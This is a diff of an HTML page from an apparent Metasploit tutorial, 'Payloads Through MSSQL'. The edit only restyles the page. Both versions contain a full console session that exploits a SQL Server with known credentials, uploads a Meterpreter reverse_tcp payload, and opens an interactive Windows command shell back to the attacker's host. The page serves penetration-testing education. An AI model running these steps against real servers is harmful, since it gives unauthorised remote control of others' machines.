@@ -4,7 +4,7 @@
   <meta content="text/html; charset=ISO-8859-1"
  http-equiv="Content-Type">
   <title>Payloads Through MSSQL</title>
-</head>
+<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
 <body>
 <h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Payloads
 Through MSSQL</h1>
@@ -44,7 +44,7 @@ payload to the underlying operating system and not use Fast-Track.
 <br>
 <br>
 </p>
-<pre style="color: rgb(0, 0, 0);">msf &gt; use windows/mssql/mssql_payload<br>msf exploit(mssql_payload) &gt; set payload windows/meterpreter/reverse_tcp<br>payload =&gt; windows/meterpreter/reverse_tcp<br>msf exploit(mssql_payload) &gt; set LHOST 10.10.1.103<br>LHOST =&gt; 10.10.1.103<br>msf exploit(mssql_payload) &gt; set RHOST 172.16.153.129<br>RHOST =&gt; 172.16.153.129<br>msf exploit(mssql_payload) &gt; set LPORT 8080<br>LPORT =&gt; 8080<br>msf exploit(mssql_payload) &gt; set MSSQL_PASS ihazpassword<br>MSSQL_PASS =&gt; ihazpassword<br>msf exploit(mssql_payload) &gt; exploit<br><br>[*] Started reverse handler on port 8080<br>[*] Warning: This module will leave QiRYOlUK.exe in the SQL Server %TEMP% directory<br>[*] Writing the debug.com loader to the disk...<br>[*] Converting the debug script to an executable...<br>[*] Uploading the payload, please be patient...<br>[*] Converting the encoded payload...<br>[*] Executing the payload...<br>[*] Sending stage (719360 bytes)<br>[*] Meterpreter session 1 opened (10.10.1.103:8080 -&gt; 10.10.1.103:47384)<br><br><u>meterpreter</u> &gt; execute -f cmd.exe -i<br>Process 3740 created.<br>Channel 1 created.<br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt;</pre>
+<pre id="code">msf &gt; use windows/mssql/mssql_payload<br>msf exploit(mssql_payload) &gt; set payload windows/meterpreter/reverse_tcp<br>payload =&gt; windows/meterpreter/reverse_tcp<br>msf exploit(mssql_payload) &gt; set LHOST 10.10.1.103<br>LHOST =&gt; 10.10.1.103<br>msf exploit(mssql_payload) &gt; set RHOST 172.16.153.129<br>RHOST =&gt; 172.16.153.129<br>msf exploit(mssql_payload) &gt; set LPORT 8080<br>LPORT =&gt; 8080<br>msf exploit(mssql_payload) &gt; set MSSQL_PASS ihazpassword<br>MSSQL_PASS =&gt; ihazpassword<br>msf exploit(mssql_payload) &gt; exploit<br><br>[*] Started reverse handler on port 8080<br>[*] Warning: This module will leave QiRYOlUK.exe in the SQL Server %TEMP% directory<br>[*] Writing the debug.com loader to the disk...<br>[*] Converting the debug script to an executable...<br>[*] Uploading the payload, please be patient...<br>[*] Converting the encoded payload...<br>[*] Executing the payload...<br>[*] Sending stage (719360 bytes)<br>[*] Meterpreter session 1 opened (10.10.1.103:8080 -&gt; 10.10.1.103:47384)<br><br><u>meterpreter</u> &gt; execute -f cmd.exe -i<br>Process 3740 created.<br>Channel 1 created.<br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
 <div style="text-align: center; color: rgb(0, 0, 0);"><a
